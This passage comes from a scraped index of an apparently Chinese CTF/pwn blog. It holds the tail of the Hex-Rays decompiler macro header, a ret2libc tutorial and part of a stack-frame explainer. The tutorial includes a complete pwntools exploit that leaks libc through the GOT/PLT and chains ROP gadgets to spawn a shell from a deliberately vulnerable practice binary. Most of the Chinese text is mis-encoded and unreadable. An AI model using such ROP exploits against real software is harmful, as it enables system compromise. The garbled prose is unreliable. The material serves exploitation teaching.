*ptr, uint32 value, int count) { uint32 *p = (uint32 *)ptr; for ( int i=0; i \u0026lt; count; i++ ) *p++ = value; } // Generate a reference to pair of operands template int16Â **PAIR**( int8 high, T low) { return ((( int16)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint8(low); } template int32Â **PAIR**( int16 high, T low) { return ((( int32)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint16(low); } template int64Â **PAIR**( int32 high, T low) { return ((( int64)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint32(low); } template uint16Â **PAIR**(uint8 high, T low) { return (((uint16)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint8(low); } template uint32Â **PAIR**(uint16 high, T low) { return (((uint32)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint16(low); } template uint64Â **PAIR**(uint32 high, T low) { return (((uint64)high) \u0026lt;\u0026lt; sizeof(high)*8) | uint32(low); } // rotate left template TÂ **ROL**(T value, uint count) { const uint nbits = sizeof(T) * 8; count %= nbits; T high = value \u0026gt;\u0026gt; (nbits - count); value \u0026lt;\u0026lt;= count; value |= high; return value; } // rotate right template TÂ **ROR**(T value, uint count) { const uint nbits = sizeof(T) * 8; count %= nbits; T low = value \u0026lt;\u0026lt; (nbits - count); value \u0026gt;\u0026gt;= count; value |= low; return value; } // carry flag of left shift template int8Â **MKCSHL**(T value, uint count) { const uint nbits = sizeof(T) * 8; count %= nbits; return (value \u0026gt;\u0026gt; (nbits-count)) \u0026amp; 1; } // carry flag of right shift template int8Â **MKCSHR**(T value, uint count) { return (value \u0026gt;\u0026gt; (count-1)) \u0026amp; 1; } // sign flag template int8Â **SETS**(T x) { if ( sizeof(T) == 1 ) return int8(x) \u0026lt; 0; if ( sizeof(T) == 2 ) return int16(x) \u0026lt; 0; if ( sizeof(T) == 4 ) return int32(x) \u0026lt; 0; return int64(x) \u0026lt; 0; } // overflow flag of subtraction (x-y) template\u0026lt;class T, class U\u0026gt; int8Â **OFSUB**(T x, U y) { if ( sizeof(T) \u0026lt; sizeof(U) ) { U x2 = x; int8 sx =Â **SETS**(x2); return (sx ^Â **SETS**(y)) \u0026amp; (sx ^Â **SETS**(x2-y)); } else { T y2 = y; int8 sx =Â **SETS**(x); return (sx ^Â **SETS**(y2)) \u0026amp; (sx ^Â **SETS**(x-y2)); } } // overflow flag of addition (x+y) template\u0026lt;class T, class U\u0026gt; int8Â **OFADD**(T x, U y) { if ( sizeof(T) \u0026lt; sizeof(U) ) { U x2 = x; int8 sx =Â **SETS**(x2); return ((1 ^ sx) ^Â **SETS**(y)) \u0026amp; (sx ^Â **SETS**(x2+y)); } else { T y2 = y; int8 sx =Â **SETS**(x); return ((1 ^ sx) ^Â **SETS**(y2)) \u0026amp; (sx ^Â **SETS**(x+y2)); } } // carry flag of subtraction (x-y) template\u0026lt;class T, class U\u0026gt; int8Â **CFSUB**(T x, U y) { int size = sizeof(T) \u0026gt; sizeof(U) ? sizeof(T) : sizeof(U); if ( size == 1 ) return uint8(x) \u0026lt; uint8(y); if ( size == 2 ) return uint16(x) \u0026lt; uint16(y); if ( size == 4 ) return uint32(x) \u0026lt; uint32(y); return uint64(x) \u0026lt; uint64(y); } // carry flag of addition (x+y) template\u0026lt;class T, class U\u0026gt; int8Â **CFADD**(T x, U y) { int size = sizeof(T) \u0026gt; sizeof(U) ? sizeof(T) : sizeof(U); if ( size == 1 ) return uint8(x) \u0026gt; uint8(x+y); if ( size == 2 ) return uint16(x) \u0026gt; uint16(x+y); if ( size == 4 ) return uint32(x) \u0026gt; uint32(x+y); return uint64(x) \u0026gt; uint64(x+y); } #else // The following definition is not quite correct because it always returns // uint64. The above C++ functions are good, though. #defineÂ **PAIR**(high, low) (((uint64)(high)\u0026lt;\u0026lt;sizeof(high)*8) | low) // For C, we just provide macros, they are not quite correct. #defineÂ **ROL**(x, y)Â **rotl**(x, y) // Rotate left #defineÂ **ROR**(x, y)Â **rotr**(x, y) // Rotate right #defineÂ **CFSHL**(x, y) invalid_operation // Generate carry flag for (x\u0026lt;\u0026lt;y) #defineÂ **CFSHR**(x, y) invalid_operation // Generate carry flag for (x\u0026gt;\u0026gt;y) #defineÂ **CFADD**(x, y) invalid_operation // Generate carry flag for (x+y) #defineÂ **CFSUB**(x, y) invalid_operation // Generate carry flag for (x-y) #defineÂ **OFADD**(x, y) invalid_operation // Generate overflow flag for (x+y) #defineÂ **OFSUB**(x, y) invalid_operation // Generate overflow flag for (x-y) #endif // No definition for rcl/rcr because the carry flag is unknown #defineÂ **RCL**(x, y) invalid_operation // Rotate left thru carry #defineÂ **RCR**(x, y) invalid_operation // Rotate right thru carry #defineÂ **MKCRCL**(x, y) invalid_operation // Generate carry flag for a RCL #defineÂ **MKCRCR**(x, y) invalid_operation // Generate carry flag for a RCR #defineÂ **SETP**(x, y) invalid_operation // Generate parity flag for (x-y) // In the decompilation listing there are some objects declarared as _UNKNOWN // because we could not determine their types. Since the C compiler does not // accept void item declarations, we replace them by anything of our choice, // for example a char: #define _UNKNOWN char #ifdef _MSC_VER #define snprintf _snprintf #define vsnprintf _vsnprintf #endif ","date":"2022å¹´10æœˆ30æ—¥","permalink":"https://peterliuzhi.top/tricks/%E5%B8%B8%E8%A7%81%E5%AE%8F%E5%AE%9A%E4%B9%89/","section":"tricks","summary":"All serious daring starts from within. â€” Harriet Beecher Stowe æœ¬æ–‡è½¬è½½è‡ªIDAé€†å‘å¸¸ç”¨å®å®šä¹‰_ä¸‘å¤§ç‹—çš„åšå®¢-CSDNåšå®¢ /* This file [contains](https://so.csdn.net/so/search?q=contains\u0026amp;spm=1001.2101.3001.7020) definitions used by the Hex-Rays decompiler output. It has type definitions and convenience macros to make the output more readable. Copyright Â© 2007-2011 Hex-Rays */ #if defined(**GNUC**) typedef long long ll; typedef","tags":["pwn","ida","å®"],"title":"å¸¸è§å®å®šä¹‰"},{"categories":["principle"],"contents":" And as we let our own light shine, we unconsciously give other people permission to do the same. â€” Nelson Mandela\nreturn to libc(ret2libc) GOT\u0026amp;PLT ä¾‹é¢˜ åˆ†æ å¦‚ä½• leak å‡ºåŸºå€ï¼Ÿ è®¡ç®—å‡º system å’Œ\u0026quot;/bin/sh\u0026quot;çš„çœŸå®åœ°å€ æ„é€ ç¬¬äºŒä¸ª payload ä»¥è·å–ç³»ç»Ÿæƒé™ å¯èƒ½å‡ºç°çš„å‘ å…¨éƒ¨ä»£ç  å½“ç¨‹åºç”±äºæ²¡æœ‰åé—¨å‡½æ•°ç­‰åŸå› æ— æ³•ç›´æ¥æ ˆæº¢å‡ºæ—¶ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ putsã€writeã€printf è¿™ç§è¾“å‡ºå‡½æ•°æ¥å¾—åˆ°ç¨‹åºåŠ¨æ€é“¾æ¥çš„ libc åŸºå€ï¼ˆæ®µåœ°å€ï¼‰ï¼Œç„¶åé€šè¿‡è™šæ‹Ÿå†…å­˜è®¡ç®—åç§»å¾—åˆ° systemã€/bin/sh çš„çœŸå®åœ°å€ï¼Œå°±å¯ä»¥é€šè¿‡å®‰æ’æ ˆæ¥å®ç°è°ƒç”¨ system å‡½æ•°\nè¯¦ç»†æ•™ç¨‹æ•¬è¯·æŸ¥çœ‹è¯¥æ•™ç¨‹ï¼æ„Ÿè°¢è¿™ä½ä½œè€…çš„ä»˜å‡ºï¼ åŒæ—¶ï¼Œæ„Ÿè°¢ä¸ºæˆ‘è§£æƒ‘å¹¶å’Œæˆ‘ä¸€èµ·æ¢è®¨é—®é¢˜æ ¹æºçš„å‡ ä½å¤§ä½¬ï¼\nGOT\u0026amp;PLT GOTï¼šGlobal Offsets Tableï¼Œä¸€å¼€å§‹å‚¨å­˜ PLT è¡¨ä¸­ç›¸å¯¹äºçœŸå®åœ°å€çš„åç§»é‡ï¼Œå½“è¯¥å‡½æ•°è°ƒç”¨è¿‡ä¸€æ¬¡åï¼Œå°±å‚¨å­˜çœŸå®åœ°å€çš„æŒ‡é’ˆï¼Œè¿™æ ·è°ƒç”¨çš„æ—¶å€™å°±ä¸ç”¨å†è®¡ç®—ä¸€æ¬¡åç§»é‡ï¼Œç›´æ¥å°±èƒ½è°ƒç”¨å¤–éƒ¨å‡½æ•°äº† PLTï¼šProcedure Linkage Tableï¼Œä¿å­˜ç€å‡½æ•°çš„è™šæ‹Ÿåœ°å€ ä¾‹é¢˜ #include \u0026lt;stdio.h\u0026gt; int main { char buffer[32]; puts(\u0026#34;Simple ROP.\\n\u0026#34;); gets(buffer); return 0; } äºŒè¿›åˆ¶æ–‡ä»¶\nåˆ†æ å½“æˆ‘ä»¬çœ‹åˆ°è¿™é“é¢˜çš„æ—¶å€™ï¼Œæˆ‘ä»¬å‘ç°äº†ä¸€ä¸ª puts å‡½æ•°ï¼Œè¿™æ˜¯ä¸€ä¸ªè¾“å‡ºå‡½æ•°ï¼Œåªè¦æˆ‘ä»¬èƒ½å¤Ÿé€šè¿‡è¯¥å‡½æ•°è¾“å‡º puts å‡½æ•°çš„çœŸå®åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ libc çš„ç¬¦å·è¡¨æä¾›çš„åç§»é‡è®¡ç®—å‡º libc çš„åŸºå€ï¼Œä»è€Œè®¡ç®—å¾—åˆ° system å’Œ\u0026quot;/bin/sh\u0026quot;çš„çœŸå®åœ°å€\nå¦‚ä½• leak å‡ºåŸºå€ï¼Ÿ main_addr= elf.sym[\u0026#34;main\u0026#34;] # è¿™ä¸¤ä¸ªåœ°å€é€šè¿‡ROPgadget --binary vuln --only \u0026#34;pop|ret\u0026#34;æ‰¾åˆ° # è¿™ä¸¤ä¸ªå±äºå¸¸ç”¨çš„å°ç‰‡æ®µ # å¦‚æœè¯¥ç¨‹åºä¸­æ²¡æœ‰pop rdi;retè¿™ä¸ªgadgetï¼Œå°±ä¸èƒ½ç”¨å¸¸è§„çš„æ€è·¯ï¼Œéœ€è¦å˜æ›´æ€è·¯äº† pop_rdi_addr = 0x4011f3 ret_addr = 0x40101a puts_plt = elf.plt[\u0026#34;puts\u0026#34;] puts_got = elf.got[\u0026#34;puts\u0026#34;] # è¿™é‡Œçš„offsetä¸º40ï¼Œä¹Ÿå°±æ˜¯0x28 payload1=b\u0026#39;a\u0026#39;*0x28+ p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) æ­¤æ—¶ï¼Œå¦‚æœæ²¡æœ‰å‡ºé—®é¢˜çš„è¯ï¼Œç¨‹åºåº”è¯¥æ‰“å°å‡ºäº†ä¸€ä¸² bytesï¼Œæˆ‘ä»¬æ¥æ”¶è¿™æ®µ bytesï¼Œç„¶åé€šè¿‡p.recv(6)+b'\\x00\\x00'æˆ‘ä»¬å°±èƒ½è®¡ç®—å‡ºputsçš„çœŸå®åœ°å€\nåŠ ä¸¤ä¸ª\\x00 æ˜¯ä¸ºäº†å¯¹é½\nè®¡ç®—å‡º system å’Œ\u0026quot;/bin/sh\u0026quot;çš„çœŸå®åœ°å€ æ­¤æ—¶æˆ‘ä»¬å·²ç»æœ‰äº†putsçš„çœŸå®åœ°å€äº†ï¼Œæˆ‘ä»¬å‡å»ç¬¦å·è¡¨ä¸­putsçš„åç§»é‡ï¼Œå°±èƒ½å¾—åˆ°åŸºå€äº†\nåŒæ ·çš„é€»è¾‘ï¼ŒåŠ ä¸Šsystemå’Œ\u0026quot;/bin/sh\u0026quot;çš„åç§»é‡å°±æ˜¯å®ƒä¿©çš„çœŸå®åœ°å€äº†ã€‚\nlibc_base = puts_addr-libc.sym[\u0026#39;puts\u0026#39;] success(\u0026#34;libc_base:\u0026#34;+hex(libc_base)) system_addr = libc_base+libc.sym[\u0026#39;system\u0026#39;] bin_sh_addr = libc_base+next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) success(\u0026#34;system_addr:\u0026#34;+hex(system_addr)) success(\u0026#34;bin_sh_addr:\u0026#34;+hex(bin_sh_addr)) æ„é€ ç¬¬äºŒä¸ª payload ä»¥è·å–ç³»ç»Ÿæƒé™ æˆ‘ä»¬å¾—åˆ°äº†éœ€è¦ç”¨åˆ°çš„å‡½æ•°å’Œå‡½æ•°éœ€è¦ä½¿ç”¨çš„å‚æ•°ï¼Œæˆ‘ä»¬ç°åœ¨åªéœ€è¦åœ¨è¿”å›å€¼ä¸­å¡«å…¥é€‚å½“çš„æŒ‡ä»¤å°±èƒ½è®©ç¨‹åºè¿è¡Œæˆ‘ä»¬æƒ³è¿è¡Œçš„å‡½æ•°äº†\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦æ³¨æ„æ ˆå¯¹é½çš„æƒ…å†µã€‚å› ä¸ºæ ˆæŒ‡é’ˆ rsp æ¯ä¸€æ¬¡ç§»åŠ¨éƒ½æ˜¯+8ï¼Œæ‰€ä»¥æ ˆåœ°å€æœ«å°¾ä¸æ˜¯ 8 å°±æ˜¯ 0ã€‚è€Œè¦æ­£å¸¸è°ƒç”¨ systemï¼Œå°±è¦ä¿è¯æœ€åé€€å‡ºæ—¶æ ˆçš„æœ€åä¸€ä½åœ°å€æ˜¯ 0ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨pop rdi;retä¹‹å‰è°ƒç”¨ä¸€æ¬¡retï¼Œè¿™æ ·æ—¢èƒ½æ­£å¸¸æ‰§è¡Œä¸‹ä¸€å¥æŒ‡ä»¤ï¼ˆå°†ä¸‹ä¸€å¥æŒ‡ä»¤ä¼ ç»™äº† ripï¼‰ï¼Œåˆèƒ½ä¿è¯é€€å‡ºæ—¶æ ˆçš„æœ€åä¸€ä½ä¸º 0 \u0026gt; æ›´å¤šä¿¡æ¯è¯·æŸ¥é˜…è¯¥åšæ–‡ï¼æ„Ÿè°¢è¿™ä½ä½œè€…çš„ä»˜å‡ºï¼\nå¯èƒ½å‡ºç°çš„å‘ ç¨‹åºä¸­æ‰¾ä¸åˆ°pop rdi;retçš„åœ°å€ï¼Œåªæœ‰pop rbp;retçš„åœ°å€ï¼šç¼–è¯‘æœ‰é—®é¢˜ï¼Œå¯èƒ½æ˜¯ gcc ç‰ˆæœ¬å¯¼è‡´çš„ï¼Œå¯ä»¥ä½¿ç”¨æˆ‘æä¾›çš„äºŒè¿›åˆ¶æ–‡ä»¶\nå…¨éƒ¨ä»£ç  from pwn import * from pwn import p64 context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) p = process(\u0026#39;./vuln1\u0026#39; ) # gdb.attach(p) p.recvuntil(\u0026#34;Simple ROP.\\n\\n\u0026#34;) elf = ELF(\u0026#39;./vuln1\u0026#39; ) libc = ELF(\u0026#39;/lib/x86_64-linux-gnu/libc.so.6\u0026#39;) main_addr= elf.sym[\u0026#34;main\u0026#34;] pop_rdi_addr = 0x4011f3 ret_addr = 0x40101a puts_plt = elf.plt[\u0026#34;puts\u0026#34;] puts_got = elf.got[\u0026#34;puts\u0026#34;] success(f\u0026#34;puts_plt:{hex(puts_plt)}\u0026#34;) success(f\u0026#34;puts_got:{hex(puts_got)}\u0026#34;) payload1=b\u0026#39;a\u0026#39;*0x28+ p64(pop_rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(main_addr) success(f\u0026#34;payload1:{payload1}\u0026#34;) p.sendline(payload1) received = p.recv(6) print(received) puts_addr = u64(received+b\u0026#39;\\x00\\x00\u0026#39;) print(puts_addr) print(type(puts_addr)) success(\u0026#34;puts_addr:\u0026#34;+hex(puts_addr)) libc_base = puts_addr-libc.sym[\u0026#39;puts\u0026#39;] success(\u0026#34;libc_base:\u0026#34;+hex(libc_base)) system_addr = libc_base+libc.sym[\u0026#39;system\u0026#39;] bin_sh_addr = libc_base+next(libc.search(b\u0026#39;/bin/sh\u0026#39;)) success(\u0026#34;system_addr:\u0026#34;+hex(system_addr)) success(\u0026#34;bin_sh_addr:\u0026#34;+hex(bin_sh_addr)) payload2=b\u0026#39;a\u0026#39;*40+p64(ret_addr)+p64(pop_rdi_addr)+p64(bin_sh_addr)+p64(system_addr) p.sendline(payload2) p.interactive() ","date":"2022å¹´10æœˆ26æ—¥","permalink":"https://peterliuzhi.top/principle/ret2libc/","section":"principle","summary":"And as we let our own light shine, we unconsciously give other people permission to do the same. â€” Nelson Mandela return to libc(ret2libc) GOT\u0026amp;PLT ä¾‹é¢˜ åˆ†æ å¦‚ä½• leak å‡ºåŸºå€ï¼Ÿ è®¡ç®—å‡º system å’Œ\u0026quot;/bin/sh\u0026quot;çš„çœŸå®åœ°å€ æ„é€ ç¬¬äºŒä¸ª payload ä»¥è·å–ç³»","tags":["pwn"],"title":"ret2libc"},{"categories":["principle"],"contents":" When we feel love and kindness toward others, it not only makes others feel loved and cared for, but it helps us also to develop inner happiness and peace. â€” Dalai Lama\npwndbgä¸­æ˜¾ç¤ºçš„æ ˆ æœ€ä¸Šæ–¹çš„rsp rbpæ ˆå¸§æŒ‡é’ˆ æ ˆçš„é«˜ä½åŒºåˆ« CALLå‡½æ•° ä¸€ä¸ªå…³äºå‡½æ•°è°ƒç”¨çš„æ¯”å–» åœ¨è¿™ä¸ªæ¯”å–»çš„åŸºç¡€ä¸Šè§£é‡Šæ ˆæº¢å‡º åœ¨è¿™ä¸ªæ¯”å–»çš„åŸºç¡€ä¸Šè§£é‡Šå±€éƒ¨å˜é‡ æ€»ç»“ pwndbgä¸­æ˜¾ç¤ºçš„æ ˆ âœ¨pwndbgä¸­é»˜è®¤åªæ˜¾ç¤º8è¡Œstackï¼Œè¿™åœ¨å¾ˆå¤šæ—¶å€™æ˜¯ä¸å¤Ÿç”¨çš„-\u0026gt;è¾“å…¥stact 10æ˜¾ç¤º10è¡Œï¼Œstack 20æ˜¾ç¤º20è¡Œï¼Œä»¥æ­¤ç±»æ¨\næœ€ä¸Šæ–¹çš„rsp rspå°±æ˜¯æ ˆé¡¶æŒ‡é’ˆï¼Œæ—¶åˆ»æŒ‡å‘å½“å‰çš„æ ˆé¡¶ï¼Œpopå’Œpushåå°±ä¼šå˜åŒ–\nâœ¨pwndbgä¸­çš„æ ˆæ›´ç¬¦åˆæ ˆçš„æ¦‚å¿µï¼Œæ ˆè¶Šå¾€ä¸Šåˆ™åœ°å€è¶Šå°ï¼Œå› æ­¤ä½ä½åœ¨ä¸Šï¼Œé«˜ä½åœ¨ä¸‹ï¼›è€Œidaä¸­åŒå‡»å˜é‡åæ˜¾ç¤ºçš„æ ˆåˆ™æ˜¾ç¤ºçš„æ˜¯è¯¥å˜é‡çš„åœ°å€è·ç¦»æ ˆé¡¶çš„åœ°å€å·®ï¼Œå› æ­¤æœ‰æ­£è´Ÿä¹‹åˆ† â”pwndbgä¸­çš„æ ˆè¿˜æœ‰å¾ˆå¤šå°ç®­å¤´ï¼Œè¿™æ˜¯ä»€ä¹ˆæ„æ€ï¼Ÿ\nè¿™äº›å°ç®­å¤´å¯ä»¥ç†è§£ä¸ºæŒ‡é’ˆçš„æ„æ€ï¼Œå¦‚æœæ˜¯'â†’'ï¼Œè¡¨ç¤ºè¯¥åœ°å€çš„è¿™ä¸ªä½ç½®å­˜å‚¨çš„æ˜¯ä¸€ä¸ªåœ°å€ï¼Œå¦‚æœæ˜¯'â†'ï¼Œè¡¨ç¤ºå­˜å‚¨çš„æ˜¯æ•°æ®ï¼Œ\né»„è‰²è¡¨ç¤ºæ˜¯æ ˆä¸Šåœ°å€ï¼Œçº¢è‰²ä¸Šè‰²è¡¨ç¤ºä»£ç æ®µï¼Œé»‘è‰²ä¸ºæ•°æ®ï¼Œ\næœ‰äº›æ•°æ®è¿˜ä¼šæœ‰ç®­å¤´æŒ‡å‘åˆ«çš„æ•°æ®ï¼Œè¿™äº›æ˜¯â€œè¯¥ä½ç½®å­˜å‚¨çš„åœ°å€çš„ä½ç½®å­˜å‚¨çš„æ•°æ®â€\nfor example: è¡¨ç¤º0x7fffffffde50è¿™ä¸ªä½ç½®å­˜å‚¨çš„æ•°æ®æ˜¯0x7fffffffdf78,åŒæ—¶0x7fffffffdf78è¿™ä¸ªä½ç½®å­˜å‚¨çš„æ•°æ®æ˜¯0x7fffffffe2da,0x7fffffffe2daè¿™ä¸ªä½ç½®å­˜å‚¨çš„æ•°æ®æ˜¯\"/home/linux/0/pwn/30\"\nè€Œè¿™ç§å¯„å­˜å™¨ç¬¦å·åœ¨å·¦è¾¹çš„æ ‡è¯†ï¼Œè¡¨ç¤ºå½“å‰r12çš„å€¼ä¸º0x7fffffffdf78ï¼Œæ¯æ¬¡popå°±ä¼šä»æ ˆé¡¶å¼¹å‡ºä¸€ä¸ªæ•°æ®åˆ°å¯¹åº”çš„å¯„å­˜å™¨ä¸­ï¼ŒåŒæ—¶rspä¼š+8,ä¹Ÿå°±æ˜¯æ˜¾ç¤ºä¸ºå¾€ä¸‹ç§»ä¸€è¡Œã€‚ rbpæ ˆå¸§æŒ‡é’ˆ rbpä¿å­˜çš„æ˜¯å­å‡½æ•°æ ˆå¸§çš„èµ·å§‹åœ°å€ï¼Œæ˜¯å®ƒä¸‹é¢é‚£ä¸€å—æ ˆï¼ˆè°ƒç”¨è€…çš„æ ˆï¼‰çš„rspï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºåœ¨æœ€å¼€å§‹çš„æ—¶å€™ç»™rspåšäº†ä¸€ä¸ªå¤‡ä»½ï¼ˆå¯ä»¥æŠŠrbpä¸­çš„bè®°ä¸ºbackupï¼‰\n32ä½ç¨‹åºä¸­ä¼šæœ‰espã€ebpï¼Œå®é™…ä¸Šå°±æ˜¯rspã€rbpçš„32ä½ä½çº§ç‰ˆæœ¬ï¼Œæ˜¯ä»–ä»¬çš„ä½å››ä½ï¼Œåªæœ‰rspã€rbpçš„ä¸€åŠ\næ ˆçš„é«˜ä½åŒºåˆ« æ ˆæ˜¯ä»é«˜åœ°å€å‘ä½åœ°å€å¢é•¿çš„(æ ˆçš„å¢é•¿å‘ç”Ÿåœ¨è°ƒç”¨å­å‡½æ•°å’Œpushçš„æ—¶å€™)ï¼Œå‘æ ˆä¸­å†™æ—¶æ˜¯ä»ä½åœ°å€åˆ°é«˜åœ°å€å†™\nè€Œæˆ‘ä»¬å¸¸è¯´çš„å¤§å°ç«¯åºæ˜¯ä»…é’ˆå¯¹æ•´æ•°è€Œè¨€çš„ï¼ˆå¯¹å­—ç¬¦ä¸²æ— æ•ˆï¼‰ï¼Œå‡è®¾ç°åœ¨æœ‰ä¸€ä¸ªæ•´æ•°ï¼Œå®ƒæ˜¯0x123456789ABCDEF0ï¼Œå¦‚æœæŒ‰æœ€å¸¸è§çš„å°ç«¯åºå­˜å‚¨ï¼Œåœ¨å†…å­˜ä¸­ï¼šä»ä½å¾€é«˜ï¼šF0 DE BC 9A 78 56 34 12 ï¼ˆæ³¨æ„ï¼Œä»¥ä¸€ä¸ªå­—èŠ‚ä¸ºä¸€ä¸ªå•å…ƒï¼ï¼‰ ï¼›è‹¥ä½¿ç”¨ä¸å¸¸è§çš„å¤§ç«¯åºï¼Œåˆ™åœ¨å†…å­˜ä¸­ï¼Œä»é«˜å¾€ä½ï¼š12 34 56 78 9A BC DE F0 ï¼ˆå¯ä»¥çœ‹ä½œå¤§ç«¯åºæ­£ç€è¯»ï¼Œç¬¦åˆäººç±»ç›´è§‰ï¼Œè€Œå°ç«¯åºåç€è¯»ï¼Œç¬¦åˆè®¡ç®—æœºé€»è¾‘ï¼‰\nâœ¨å¦å¤–æåŠä¸€ä¸‹åœ¨è¿™æ–¹é¢å¾ˆè ¢çš„idaï¼Œä¾‹å¦‚ä¸€ä¸ªæ•´å‹æ•°ï¼š0x41424344ï¼Œç”±äºæ˜¯å°ç«¯åºï¼Œå†…å­˜ä¸­å­˜å‚¨çš„æ˜¯ 44 43 42 41ï¼Œç¿»è¯‘æˆå­—ç¬¦ä¸²å°±æ˜¯\u0026quot;DCBA\u0026quot;ï¼Œä½†æ˜¯å½“ä½ åœ¨idaä¸­å³é”®æ ‡æ³¨è¿™ä¸ªæ•´å‹æ•°æ®ä¸ºå­—ç¬¦ä¸²æ—¶ï¼Œidaä¼šæ˜¾ç¤ºï¼š\u0026ldquo;ABCD\u0026rdquo;,æ‰€ä»¥åœ¨è¿™ç§æƒ…å†µä¸‹è„‘å­é‡Œè‡ªå·±ç»™å®ƒå€’è¿‡æ¥ã€‚\nCALLå‡½æ•° å®Œæ•´çš„å‡½æ•°è°ƒç”¨è¿‡ç¨‹è¦æœ‰å‡ ä¸ªè¯­å¥å®ç°çš„ï¼Œ\nåœ¨è¿™é‡Œï¼Œmainå‡½æ•°ä¸­calläº†ä¸€ä¸ªç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°vulnï¼Œæ­¤æ—¶å°†vulnæ‰€åœ¨åœ°å€ä¼ ç»™ripå¯„å­˜å™¨(ripå¯„å­˜å™¨æ˜¯æ‰€æœ‰å¯„å­˜å™¨ä¸­æœ€ç¥å¥‡çš„å¯„å­˜å™¨ï¼Œç¥å¥‡ä¹‹å¤„åœ¨äºripä¿å­˜çš„å€¼æ˜¯ä»€ä¹ˆï¼Œç¨‹åºå°±ä¼šæ‰§è¡Œå“ªä¸ªåœ°å€çš„æŒ‡ä»¤)ï¼Œä¼ äº†ä»¥åï¼Œç¨‹åºè½¬åˆ°vulnå‡½æ•°æ‰§è¡Œï¼Œè¿™ä¸ªæ—¶å€™rbpå’Œrspè¿˜æœªå‘ç”Ÿå˜åŒ–ã€‚\næ¥ç€ï¼Œçœ‹åˆ°vulnå‡½æ•°çš„æŒ‡ä»¤ç¬¬ä¸€å¥ï¼špush rbpï¼Œå°†rbpå½“å‰çš„å€¼å‹å…¥æ ˆä¸­ï¼Œåœ¨æ ˆä¸­ä¿å­˜rbpåŸæ¥çš„å€¼(ç”¨Cè¯­è¨€å»ç†è§£å°±æ˜¯æ–°å»ºäº†ä¸€ä¸ªå˜é‡æ¥ä¿å­˜rbpåŸæ¥çš„å€¼)ï¼Œ\nç´§æ¥ç€ä¸‹ä¸€å¥ï¼šmov rbp, rspï¼Œå°†rspå½“å‰çš„å€¼ä¼ å…¥rbpï¼Œç”¨rbpä¿å­˜rspåŸæœ‰çš„å€¼ï¼Œæ‰€ä»¥è¯´rbpæ˜¯ç»™rspåšå¤‡ä»½ç”¨çš„ã€‚\nè€Œæœ‰è¶£çš„æ˜¯ï¼Œå½“å‰çš„rbpæ‰€å­˜å‚¨çš„åœ°å€ï¼Œå®ƒè¿™é‡Œçš„æ•°æ®æ˜¯ä»€ä¹ˆå‘¢ï¼Œå°±æ˜¯åŸrbpã€‚\ncallé™¤äº†æ”¹å˜ripï¼Œè¿˜å°†callæ‰€åœ¨çš„ä½ç½®çš„ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€å‹å…¥äº†æ ˆä¸­ï¼Œä¹Ÿå°±æ˜¯ï¼šè¿”å›åœ°å€ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå‡½æ•°è°ƒç”¨ç¬¬ä¸€ä¸ªå‹å…¥è¿”å›åœ°å€ï¼Œç¬¬äºŒä¸ªå‹å…¥åŸrbpçš„å€¼ã€‚å½“å‡½æ•°è¿”å›çš„æ—¶å€™ï¼Œæ‰§è¡Œleaveå’Œretä¸¤æ¡æŒ‡ä»¤ï¼Œï¼ˆleaveç­‰åŒäºï¼šmov rsp, rbp; pop rbpï¼‰ï¼Œä¸¤æ¡è¯­å¥æŠŠä¹‹å‰çš„rspå’Œrbpçš„å€¼éƒ½æ¢å¤äº†ï¼Œæ¥ç€æ‰§è¡Œretï¼Œä½œç”¨æ˜¯ï¼špop ripï¼ˆå¯èƒ½åªæ˜¯å› ä¸ºç”¨å¾—å¤šï¼Œè€Œä¸”éƒ½ç”¨äºè¿”å›ï¼Œæ‰å†™æˆretï¼Œå®é™…ä¸Šä¸pop ripå®Œå…¨ç­‰ä»·ã€‚ï¼‰ï¼Œé‚£ä¹ˆpop ripï¼Œå°±æ˜¯å°†å‡½æ•°è°ƒç”¨å‰ä¿å­˜çš„è¿”å›åœ°å€é€è¿›ripå¯„å­˜å™¨ï¼Œä¸‹ä¸€å¥æŒ‡ä»¤å°±ä¼šåˆ°é‚£é‡Œæ‰§è¡Œï¼Œäºæ˜¯å¯ä»¥çœ‹åˆ°åœ¨å‡½æ•°è¿”å›çš„æ—¶å€™ï¼Œæ ˆç»“æ„è¢«æ¢å¤æˆå‡½æ•°è¢«è°ƒç”¨å‰çš„æ ·å­äº†ã€‚\nåœ¨leaveï¼ˆmov rsp, rbp; pop rbpï¼‰æ—¶ï¼Œè¿™é‡Œåœ¨æ‰§è¡Œpop rbpæ—¶ï¼Œrspå› ä¸ºå·²ç»è¢«èµ‹å€¼ä¸ºrbpå½“å‰å€¼ï¼Œè€Œä¹‹å‰å°±æåˆ°è¿‡rbpæ‰€æŒ‡ä½ç½®å­˜å‚¨çš„æ•°æ®æ—¶åŸrbpï¼Œæ‰€ä»¥pop rbpå°±ä¼šå°†å½“å‰rspæ‰€æŒ‡ï¼Œä¹Ÿæ˜¯rbpæ‰€æŒ‡çš„æ•°æ®å¼¹åˆ°rbpï¼Œæ¢å¤rbpåŸæœ‰å€¼ï¼Œç„¶årspæŒ‡å‘äº†rbpåŸæœ‰çš„å€¼ï¼Œç´§æ¥ç€åˆpopäº†ä¸€æ¬¡ï¼Œé‚£ä¹ˆåœ¨ä¸Šæ¬¡popäº†æ ˆé¡¶ä¸Šä¿å­˜çš„åŸrbpåï¼Œæ–°çš„æ 